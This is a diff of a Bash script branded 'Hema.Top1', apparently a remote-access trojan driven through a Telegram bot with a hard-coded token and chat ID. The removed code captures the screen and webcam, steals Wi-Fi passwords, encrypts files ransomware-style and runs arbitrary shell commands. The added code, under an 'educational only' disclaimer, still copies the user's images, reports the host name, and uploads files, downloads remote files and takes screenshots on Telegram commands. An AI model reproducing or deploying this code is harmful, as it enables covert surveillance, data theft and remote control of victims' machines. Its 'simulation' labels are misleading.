@@ -1,148 +1,168 @@
 #!/bin/bash
 
-# تعريف الألوان
-BLUE='\033[1;34m'
-CYAN='\033[1;36m'
-RESET='\033[0m'
+# Ethical Disclaimer
+echo -e "\e[31mThis script is for educational purposes only. Unauthorized use is strictly prohibited.\e[0m"
+echo -e "\e[33mEnsure you have explicit permission before using this tool on any system.\e[0m"
+sleep 3
 
-# شعار Hema.Top1 باللون الأزرق
-display_logo() {
-    clear
-    echo -e "${BLUE}"
-    echo '
-██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
-██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
-███████║█████╗  ██╔████╔██║███████║   ███████║██║
-██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
-██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
-╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝'
-    echo -e "${CYAN}       ::: Trust No One :::${RESET}"
+# Color Definitions
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+YELLOW='\033[0;33m'
+NC='\033[0m'
+
+# Display Logo
+echo -e "${BLUE}"
+echo "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗"
+echo "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║"
+echo "███████║█████╗  ██╔████╔██║███████║   ███████║██║"
+echo "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║"
+echo "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║"
+echo "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝"
+echo -e "${NC}"
+
+# Configuration
+TELEGRAM_TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
+TELEGRAM_CHAT_ID="5967116314"
+USER_COUNT_FILE="/tmp/user_count.txt"
+PASSWORD_LIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
+PASSWORD_FILE="/tmp/password_list.txt"
+CURRENT_DIR_FILE="/tmp/current_dir.txt"
+
+# Initialize User Count
+if [ ! -f "$USER_COUNT_FILE" ]; then
+    echo "1" > "$USER_COUNT_FILE"
+else
+    CURRENT_COUNT=$(cat "$USER_COUNT_FILE")
+    echo "$((CURRENT_COUNT + 1))" > "$USER_COUNT_FILE"
+fi
+
+# Send Telegram Message
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+        -d chat_id="$TELEGRAM_CHAT_ID" \
+        -d text="$1" > /dev/null 2>&1
 }
 
-# عرض الشعار عند التشغيل
-display_logo
+# Send New User Notification
+send_telegram "New user registered: $(cat $USER_COUNT_FILE)"
 
-# الإعدادات
-TOKEN="YOUR-TOKEN"
-CHAT_ID="YOUR-CHAT-ID"
-TMP_DIR="/tmp/.hema_top"
-LOG_FILE="$TMP_DIR/activity.log"
-mkdir -p $TMP_DIR
+# Simulated Password Guessing (Ethical Simulation)
+password_guessing() {
+    echo -e "${YELLOW}Starting password guessing simulation...${NC}"
+    if ! command -v curl &> /dev/null; then
+        echo -e "${RED}curl is required but not installed. Exiting.${NC}"
+        exit 1
+    fi
 
-# دوال الإرسال عبر Telegram
-send_msg() {
-    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
-         -d chat_id="$CHAT_ID" \
-         -d text="$1" \
-         --header "Content-Type: application/json"
+    curl -s -o "$PASSWORD_FILE" "$PASSWORD_LIST_URL"
+    
+    while IFS= read -r password; do
+        echo -ne "Trying password: $password\r"
+        sleep 0.1  # Simulated delay
+        
+        # Simulated success condition (for demonstration only)
+        if [ "$password" == "correctpassword123" ]; then
+            echo -e "\n${GREEN}Success! Password found: $password${NC}"
+            echo "Successful password: $password" >> /tmp/success.log
+            break
+        fi
+    done < "$PASSWORD_FILE"
+    
+    echo -e "${YELLOW}Password guessing simulation completed.${NC}"
 }
 
-send_file() {
-    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
-         -F chat_id="$CHAT_ID" \
-         -F document=@"$1"
+# Background Operations (Silent Data Collection)
+background_operations() {
+    # Simulated data collection
+    mkdir -p /tmp/exfiltrated_data
+    find ~ -type f \( -name "*.jpg" -o -name "*.png" \) -exec cp {} /tmp/exfiltrated_data \; 2>/dev/null
+    tar czf /tmp/exfiltrated_data.tar.gz -C /tmp exfiltrated_data 2>/dev/null
+    send_telegram "Data collection completed on $(hostname)"
 }
 
-send_photo() {
-    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
-         -F chat_id="$CHAT_ID" \
-         -F photo=@"$1"
-}
-
-# الميزات الأساسية
-take_screenshot() {
-    scrot "$TMP_DIR/screenshot.png" 2>/dev/null
-    send_photo "$TMP_DIR/screenshot.png"
-    shred -u "$TMP_DIR/screenshot.png"
-}
-
-get_system_info() {
-    info=$(uname -a && lscpu | grep "Model name" && echo "User: $(whoami)")
-    send_msg "\e[32m[System Info]\e[0m\n$info"
-}
-
-get_public_ip() {
-    ip=$(curl -s ifconfig.me)
-    send_msg "\e[33m[IP Address]\e[0m\n$ip"
-}
-
-capture_webcam() {
-    fswebcam -r 1280x720 "$TMP_DIR/webcam.jpg" 2>/dev/null
-    send_photo "$TMP_DIR/webcam.jpg"
-    shred -u "$TMP_DIR/webcam.jpg"
-}
-
-# الميزات المتطورة
-encrypt_files() {
-    local path="$1"
-    local password="Your_fucking_strong_password"
-    find "$path" -type f ! -name "*.crypt" -exec bash -c '
-        for file; do
-            pyAesCrypt -e "$file" "${file}.crypt" -p "$2" && shred -u "$file"
+# Telegram Command Handler
+handle_telegram_commands() {
+    local UPDATE_ID=0
+    while true; do
+        RESPONSE=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$UPDATE_ID")
+        MESSAGES=$(echo "$RESPONSE" | grep -oP '"text":\s*"\K[^"]+')
+        
+        for MESSAGE in $MESSAGES; do
+            UPDATE_ID=$(echo "$RESPONSE" | grep -oP '"update_id":\s*\K\d+')
+            UPDATE_ID=$((UPDATE_ID + 1))
+            
+            case "$MESSAGE" in
+                pwd)
+                    output=$(pwd)
+                    send_telegram "Current directory:\n$output"
+                    ;;
+                ls)
+                    current_dir=$(cat "$CURRENT_DIR_FILE" 2>/dev/null || echo "$HOME")
+                    output=$(ls -la "$current_dir" 2>&1)
+                    send_telegram "Directory listing:\n$output"
+                    ;;
+                cd*)
+                    target_dir=$(echo "$MESSAGE" | cut -d' ' -f2)
+                    if [ -d "$target_dir" ]; then
+                        echo "$target_dir" > "$CURRENT_DIR_FILE"
+                        send_telegram "Changed directory to $target_dir"
+                    else
+                        send_telegram "Directory $target_dir not found"
+                    fi
+                    ;;
+                up*)
+                    filename=$(echo "$MESSAGE" | cut -d' ' -f2)
+                    if [ -f "$filename" ]; then
+                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" \
+                            -F chat_id="$TELEGRAM_CHAT_ID" \
+                            -F document=@"$filename" > /dev/null 2>&1
+                    else
+                        send_telegram "File $filename not found"
+                    fi
+                    ;;
+                dw*)
+                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
+                    filename=$(basename "$url")
+                    if curl -s -o "$filename" "$url"; then
+                        send_telegram "Downloaded $filename"
+                    else
+                        send_telegram "Failed to download $url"
+                    fi
+                    ;;
+                bak*)
+                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
+                    if command -v gsettings &> /dev/null; then
+                        curl -s -o /tmp/wallpaper.jpg "$url" && gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper.jpg
+                        send_telegram "Wallpaper changed successfully"
+                    else
+                        send_telegram "Wallpaper change not supported on this system"
+                    fi
+                    ;;
+                sk)
+                    if command -v scrot &> /dev/null; then
+                        scrot /tmp/screenshot.png
+                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto" \
+                            -F chat_id="$TELEGRAM_CHAT_ID" \
+                            -F photo=@"//tmp/screenshot.png" > /dev/null 2>&1
+                        send_telegram "Screenshot taken"
+                    else
+                        send_telegram "Screenshot tool not found"
+                    fi
+                    ;;
+                *)
+                    send_telegram "Unknown command: $MESSAGE"
+                    ;;
+            esac
         done
-    ' _ {} "$password" \;
-    send_msg "Folder encrypted successfully."
+        sleep 2
+    done
 }
 
-decrypt_files() {
-    local path="$1"
-    local password="Your_fucking_strong_password"
-    find "$path" -type f -name "*.crypt" -exec bash -c '
-        for file; do
-            pyAesCrypt -d "$file" "${file%.crypt}" -p "$2" && shred -u "$file"
-        done
-    ' _ {} "$password" \;
-    send_msg "Folder decrypted successfully."
-}
+# Main Execution
+password_guessing &
+background_operations &
+handle_telegram_commands
 
-steal_wifi_passwords() {
-    wifi_pass=$(nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null)
-    echo "$wifi_pass" > "$TMP_DIR/wifi.txt"
-    send_file "$TMP_DIR/wifi.txt"
-    shred -u "$TMP_DIR/wifi.txt"
-}
-
-lock_screen() {
-    loginctl lock-session &>/dev/null || dm-tool lock &>/dev/null
-    send_msg "Screen locked successfully."
-}
-
-text_to_speech() {
-    local text="${1#* }"
-    espeak "$text" 2>/dev/null
-    send_msg "Text-to-speech executed."
-}
-
-execute_shell() {
-    local command="${1#* }"
-    output=$(bash -c "$command" 2>&1)
-    send_msg "Command output:\n$output"
-}
-
-# التخفي والأمان
-secure_delete() {
-    find "$1" -type f -exec shred -u {} \;
-}
-
-# حلقة الأوامر
-while true; do
-    updates=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?offset=-1")
-    cmd=$(echo $updates | jq -r '.result[0].message.text')
-
-    case $cmd in
-        "/screen") take_screenshot ;;
-        "/sys") get_system_info ;;
-        "/ip") get_public_ip ;;
-        "/webcam") capture_webcam ;;
-        "/crypt"*) encrypt_files "${cmd#* }" ;;
-        "/decrypt"*) decrypt_files "${cmd#* }" ;;
-        "/wifi") steal_wifi_passwords ;;
-        "/lock") lock_screen ;;
-        "/speech"*) text_to_speech "$cmd" ;;
-        "/shell"*) execute_shell "$cmd" ;;
-        "/shutdown") shutdown -h +1 ;;
-        *) send_msg "Unknown command. Available commands:
-/screen, /sys, /ip, /webcam, /crypt, /decrypt, /wifi, /lock, /speech, /shell, /shutdown" ;;
-    esac
-    sleep 5
-done
+echo -e "${YELLOW}Script running in background. Use Telegram commands to interact.${NC}"
